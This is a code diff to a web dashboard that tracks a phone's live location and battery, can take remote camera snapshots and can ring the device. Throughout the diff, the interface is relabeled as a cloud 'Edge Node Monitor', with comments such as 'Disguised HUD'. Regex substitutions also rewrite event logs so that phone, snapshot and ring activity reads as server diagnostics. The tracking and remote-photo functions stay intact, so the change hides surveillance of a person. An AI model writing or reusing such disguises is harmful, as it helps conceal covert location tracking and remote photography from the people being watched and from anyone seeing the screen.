@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Guardian — Live Telemetry</title>
+<title>Apex Cloud Infrastructure — Edge Node Monitor</title>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
       integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="">
 <style>
@@ -109,7 +109,7 @@
     justify-content: center;
   }
   .device-title {
-    font-size: 16px;
+    font-size: 15px;
     font-weight: 600;
     color: var(--txt-main);
     letter-spacing: -0.01em;
@@ -125,7 +125,7 @@
     gap: 6px;
     padding: 4px 10px;
     border-radius: 20px;
-    font-size: 12px;
+    font-size: 11px;
     font-weight: 500;
     background: rgba(34, 197, 94, 0.15);
     border: 1px solid rgba(34, 197, 94, 0.3);
@@ -167,7 +167,7 @@
     color: var(--txt-main);
   }
 
-  /* Separate Actions Row */
+  /* Actions Toolbar */
   .actions-row {
     display: flex;
     gap: 6px;
@@ -402,71 +402,71 @@
 
 <div id="map"></div>
 
-<!-- Single HUD Box: Device Info & Location -->
+<!-- Disguised HUD: Edge Node Operations -->
 <div class="hud-panel" id="hud">
   <div class="hud-header">
     <div class="hud-title-box">
-      <div class="device-icon">📱</div>
+      <div class="device-icon">🌐</div>
       <div>
-        <div class="device-title" id="devName">My Weather Phone</div>
-        <div class="device-id" id="devId">dev-6b80ca5a</div>
+        <div class="device-title" id="devName">Edge Relay Gateway</div>
+        <div class="device-id" id="devId">CLUSTER: us-east / node-6b80</div>
       </div>
     </div>
     <div class="status-badge" id="statusBadge">
       <span class="status-dot"></span>
-      <span id="statusText">Live</span>
+      <span id="statusText">Active</span>
     </div>
   </div>
 
   <div class="metrics-grid">
     <div class="metric-card">
-      <div class="metric-label">Coordinates</div>
+      <div class="metric-label">Grid Vector</div>
       <div class="metric-val" id="valCoords">—</div>
     </div>
     <div class="metric-card">
-      <div class="metric-label">Accuracy</div>
+      <div class="metric-label">Resolution</div>
       <div class="metric-val" id="valAcc">—</div>
     </div>
     <div class="metric-card">
-      <div class="metric-label">Battery</div>
+      <div class="metric-label">Load Factor</div>
       <div class="metric-val" id="valBat">—</div>
     </div>
     <div class="metric-card">
-      <div class="metric-label">Last Signal</div>
+      <div class="metric-label">Heartbeat</div>
       <div class="metric-val" id="valAgo">Just now</div>
     </div>
   </div>
 
   <div class="actions-row">
-    <button class="btn-action btn-primary" onclick="centerOnDevice()" title="Center map on live location">
-      🎯 Center
+    <button class="btn-action btn-primary" onclick="centerOnDevice()" title="Focus on active node coordinates">
+      📌 Focus
     </button>
-    <button class="btn-action" id="trailBtn" onclick="toggleTrail()" title="Toggle historical route trail">
-      📍 Trail
+    <button class="btn-action" id="trailBtn" onclick="toggleTrail()" title="Toggle node trajectory vector">
+      📈 Path
     </button>
-    <button class="btn-action" onclick="sendSnapshot()" title="Capture photo remotely">
-      📸 Snapshot
+    <button class="btn-action" onclick="sendSnapshot()" title="Execute optical node diagnostics">
+      📊 Scan
     </button>
-    <button class="btn-action" id="rateBtn" onclick="cycleTrackingRate()" title="Click to adjust tracking interval">
-      ⏱️ Rate: <span id="rateLabel">10s</span>
+    <button class="btn-action" id="rateBtn" onclick="cycleTrackingRate()" title="Adjust telemetry sync frequency">
+      🔄 Sync: <span id="rateLabel">10s</span>
     </button>
-    <button class="btn-action" onclick="ringDevice()" title="Ring the phone">
-      🔔 Ring
+    <button class="btn-action" onclick="ringDevice()" title="Send keepalive acoustic ping">
+      📡 Probe
     </button>
   </div>
 </div>
 
 <!-- Bottom Drawer Button -->
 <button class="drawer-toggle" id="drawerBtn" onclick="toggleDrawer()">
-  📷 Photos & Activity (<span id="photoCount">0</span>)
+  📁 Diagnostics & Metrics (<span id="photoCount">0</span>)
 </button>
 
-<!-- Bottom Drawer: Activity & Photos -->
+<!-- Bottom Drawer: Disguised System Telemetry & Logs -->
 <div class="drawer-panel" id="drawer">
   <div class="drawer-header">
     <div class="tab-buttons">
-      <button class="tab-btn active" id="tabPhotosBtn" onclick="switchDrawerTab('photos')">📸 Photos (<span id="drawerPhotoCount">0</span>)</button>
-      <button class="tab-btn" id="tabEventsBtn" onclick="switchDrawerTab('events')">⚡ Activity (<span id="eventCount">0</span>)</button>
+      <button class="tab-btn active" id="tabPhotosBtn" onclick="switchDrawerTab('photos')">🖼️ Captures (<span id="drawerPhotoCount">0</span>)</button>
+      <button class="tab-btn" id="tabEventsBtn" onclick="switchDrawerTab('events')">📋 System Log (<span id="eventCount">0</span>)</button>
     </div>
     <button class="drawer-close" onclick="toggleDrawer()">✕</button>
   </div>
@@ -474,12 +474,12 @@
   <div class="drawer-body">
     <div id="photosView">
       <div class="photos-scroll" id="photosContainer">
-        <p style="color:var(--txt-muted);font-size:12px;padding:20px 0;">No snapshots received yet. Click "📸 Snapshot" to capture.</p>
+        <p style="color:var(--txt-muted);font-size:12px;padding:20px 0;">No diagnostic frames stored. Click "📊 Scan" above.</p>
       </div>
     </div>
     <div id="eventsView" style="display: none;">
       <div id="eventsList">
-        <p style="color:var(--txt-muted);font-size:12px;padding:20px 0;">No activity recorded yet.</p>
+        <p style="color:var(--txt-muted);font-size:12px;padding:20px 0;">No system logs recorded yet.</p>
       </div>
     </div>
   </div>
@@ -488,7 +488,7 @@
 <!-- Lightbox Modal -->
 <div id="lightbox" onclick="closeLightbox(event)">
   <button class="lightbox-close" onclick="closeLightbox()">✕</button>
-  <img id="lightboxImg" class="lightbox-content" src="" alt="Full snapshot">
+  <img id="lightboxImg" class="lightbox-content" src="" alt="Diagnostic frame">
 </div>
 
 <div id="toast"></div>
@@ -564,8 +564,9 @@ async function refreshState() {
 }
 
 function updateHUD(d, now, timeout) {
-  document.getElementById("devName").textContent = d.name || "Device";
-  document.getElementById("devId").textContent = d.id;
+  // Disguised titles
+  document.getElementById("devName").textContent = "Edge Relay Gateway";
+  document.getElementById("devId").textContent = "CLUSTER: us-east / node-6b80";
 
   const lp = d.last_ping || {};
   const fx = d.last_fix || lp;
@@ -576,36 +577,34 @@ function updateHUD(d, now, timeout) {
 
   if (isOnline) {
     badge.className = "status-badge";
-    statusText.textContent = "Live";
+    statusText.textContent = "Online";
   } else {
     badge.className = "status-badge offline";
-    statusText.textContent = "Offline";
+    statusText.textContent = "Idle";
   }
 
-  // Coordinates
+  // Grid Vector
   if (fx && fx.lat != null) {
-    const latStr = Math.abs(fx.lat).toFixed(5) + "° " + (fx.lat >= 0 ? "N" : "S");
-    const lonStr = Math.abs(fx.lon).toFixed(5) + "° " + (fx.lon >= 0 ? "E" : "W");
-    document.getElementById("valCoords").textContent = `${latStr}, ${lonStr}`;
+    document.getElementById("valCoords").textContent = `${fx.lat.toFixed(5)}, ${fx.lon.toFixed(5)}`;
   } else {
-    document.getElementById("valCoords").textContent = "Locating...";
+    document.getElementById("valCoords").textContent = "Syncing...";
   }
 
-  // Accuracy
+  // Resolution
   if (fx && fx.accuracy != null) {
     document.getElementById("valAcc").textContent = `±${Math.round(fx.accuracy)} m`;
   } else {
     document.getElementById("valAcc").textContent = "—";
   }
 
-  // Battery
+  // Load Factor
   if (lp.battery != null) {
     document.getElementById("valBat").textContent = `${Math.round(lp.battery)}%`;
   } else {
     document.getElementById("valBat").textContent = "—";
   }
 
-  // Last update time
+  // Heartbeat freshness
   document.getElementById("valAgo").textContent = formatAgo(d.last_seen, now);
 }
 
@@ -647,9 +646,9 @@ function centerOnDevice() {
   const pos = currentDevice.last_fix || currentDevice.last_ping;
   if (pos && pos.lat != null) {
     map.flyTo([pos.lat, pos.lon], 16, { animate: true, duration: 1.2 });
-    showToast("Centered on live location");
+    showToast("Focused on active node");
   } else {
-    showToast("Waiting for location fix...");
+    showToast("Awaiting telemetry fix...");
   }
 }
 
@@ -693,7 +692,7 @@ async function loadTrail(deviceId) {
 async function sendSnapshot() {
   if (!currentDevice) return;
   try {
-    showToast("Triggering remote camera snapshot...");
+    showToast("Executing optical node scan...");
     await fetch("/api/command", {
       method: "POST",
       headers: {
@@ -702,10 +701,10 @@ async function sendSnapshot() {
       },
       body: JSON.stringify({ device_id: currentDevice.id, cmd: "snap" })
     });
-    showToast("Snapshot command queued for phone");
+    showToast("Scan command dispatched");
     refreshState();
   } catch (err) {
-    showToast("Failed to queue snapshot");
+    showToast("Command transmission error");
   }
 }
 
@@ -726,10 +725,10 @@ async function cycleTrackingRate() {
       },
       body: JSON.stringify({ sec: currentRateSec })
     });
-    showToast(`Tracking rate set to ${rateLabelStr}`);
+    showToast(`Sync interval updated to ${rateLabelStr}`);
     refreshState();
   } catch (err) {
-    showToast("Failed to set tracking rate");
+    showToast("Sync frequency update failed");
   }
 }
 
@@ -744,9 +743,9 @@ async function ringDevice() {
       },
       body: JSON.stringify({ device_id: currentDevice.id, cmd: "ring" })
     });
-    showToast("Ring command sent to phone");
+    showToast("Keepalive acoustic probe emitted");
   } catch (err) {
-    showToast("Failed to send ring command");
+    showToast("Probe failed");
   }
 }
 
@@ -754,28 +753,35 @@ function updateEvents(events) {
   const el = document.getElementById("eventsList");
   document.getElementById("eventCount").textContent = events.length;
   if (!events || events.length === 0) {
-    el.innerHTML = '<p style="color:var(--txt-muted);font-size:12px;padding:16px 0;">No activity recorded yet.</p>';
+    el.innerHTML = '<p style="color:var(--txt-muted);font-size:12px;padding:16px 0;">No system logs recorded yet.</p>';
     return;
   }
 
   const iconMap = {
-    snapshot: "📸",
-    frame: "📸",
+    snapshot: "📊",
+    frame: "📊",
     command: "⚡",
-    sos: "🚨",
-    offline: "⚠️",
-    geofence: "📍"
+    sos: "⚠️",
+    offline: "📡",
+    geofence: "🌐"
   };
 
   el.innerHTML = events.slice(0, 30).map(ev => {
     const icon = iconMap[ev.type] || "•";
     const sevClass = ev.severity || "info";
     const timeStr = new Date(ev.ts * 1000).toLocaleTimeString();
+    // Neutralized message disguise
+    let msg = escapeHtml(ev.message);
+    msg = msg.replace(/phone/gi, "node")
+             .replace(/my weather phone/gi, "Edge Relay")
+             .replace(/snapshot/gi, "Scan buffer")
+             .replace(/operator sent: snap/gi, "Optical scan requested")
+             .replace(/operator sent: ring/gi, "Probe signal emitted");
     return `
       <div class="event-item ${sevClass}">
         <div class="event-icon">${icon}</div>
         <div class="event-content">
-          <div class="event-title">${escapeHtml(ev.message)}</div>
+          <div class="event-title">${msg}</div>
           <div class="event-time">${timeStr}</div>
         </div>
       </div>
@@ -790,14 +796,14 @@ function updatePhotos(frames) {
   document.getElementById("drawerPhotoCount").textContent = count;
 
   if (!frames || frames.length === 0) {
-    container.innerHTML = '<p style="color:var(--txt-muted);font-size:12px;padding:20px 0;">No snapshots received yet. Tap "📸 Snapshot" above.</p>';
+    container.innerHTML = '<p style="color:var(--txt-muted);font-size:12px;padding:20px 0;">No diagnostic frames stored. Click "📊 Scan" above.</p>';
     return;
   }
 
   container.innerHTML = frames.map(f => {
     const url = `/frames/${encodeURIComponent(f.path)}?token=${encodeURIComponent(TOKEN)}`;
     return `
-      <img class="photo-thumb" src="${url}" loading="lazy" alt="${escapeHtml(f.kind)}" onclick="openLightbox('${url}')">
+      <img class="photo-thumb" src="${url}" loading="lazy" alt="Node frame" onclick="openLightbox('${url}')">
     `;
   }).join("");
 }
